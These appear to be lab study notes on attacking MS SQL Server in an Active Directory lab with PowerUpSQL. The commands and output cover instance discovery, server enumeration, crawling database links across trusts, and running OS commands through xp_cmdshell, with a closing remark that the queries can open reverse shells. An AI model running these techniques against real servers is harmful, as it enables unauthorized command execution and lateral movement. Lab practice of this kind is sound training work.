## MS SQL 

```powershell
# Import PowerUpSQL.psd1
C:> Import-Module C:\AD\Tools\PowerUpSQL-master \PowerupSQL.psd1
```
### Enumerate
---
#### Discovery (SPN Scan)
```powershell
C:> Get-SQLInstanceDomain
```
#### Gather Information
```powershell
C:> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
...
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
...
Currentlogin           : dcorp\student76
IsSysadmin             : No    -> Need to find out a Yes here
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
...
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
...
Currentlogin           : dcorp\student76
IsSysadmin             : No
ActiveSessions         : 1
```
#### Check Accessibility
```powershell
C:> Get-SQLConnectionTestThreaded
ComputerName    Instance        Status
------------    --------        ------
DCORP-STUDENT76 DCORP-STUDENT76 Not Accessible

C:> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
ComputerName                           Instance                                    Status
------------                           --------                                    ------
dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local,1433  Not Accessible
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local       Not Accessible
dcorp-sql1.dollarcorp.moneycorp.local  dcorp-sql1.dollarcorp.moneycorp.local,1433  Not Accessible
dcorp-mgmt.dollarcorp.moneycorp.local  dcorp-mgmt.dollarcorp.moneycorp.local       Not Accessible
DCORP-STUDENT76                        DCORP-STUDENT76                             Not Accessible
```
### Database Links
---
A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust
#### Look for Links to Remote Servers
```powershell
C:> Get-SQLServerLink -Instance <mssql_instance> -Verbose
# Also can do the query "select * from master..sysservers"
```
#### Enumerate Database Links
```powershell
# Find for a Sysadmin attribute on a server
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Verbose



```
### Execute Commands
---
```powershell
# On Specific Instance
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <sq_host>

# Execute query on every link of the chain
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Query "exec master..xp_cmdshell 'whoami'" 

# The query is returned in CustomQuery field
Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
# Use this queries to open reverse shells
```
